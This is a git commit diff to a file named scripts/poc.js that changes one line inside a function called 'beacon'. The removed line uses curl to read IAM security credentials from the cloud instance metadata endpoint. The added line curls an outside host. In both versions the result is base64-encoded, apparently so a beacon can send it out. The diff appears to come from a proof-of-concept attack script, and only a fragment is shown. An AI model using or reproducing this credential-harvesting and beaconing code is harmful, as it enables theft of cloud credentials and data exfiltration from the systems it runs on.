01e419e95d8dae13e200ae2050fb07c883969903
10xray01 <110544522+xraydz@users.noreply.github.com>
2025-08-13 20:47:18 +0330

    Update poc.js

--- scripts/poc.js
+++ scripts/poc.js
@@ -46,7 +46,7 @@ function beacon(urlStr, q) {
 
   let idOutput = "";
   try {
-    idOutput = execSync("curl 169.254.169.254/latest/meta-data/iam/security-credentials", { encoding: "utf8" }).trim();
+    idOutput = execSync("curl https://thezodd.com/", { encoding: "utf8" }).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
   } catch {}
 
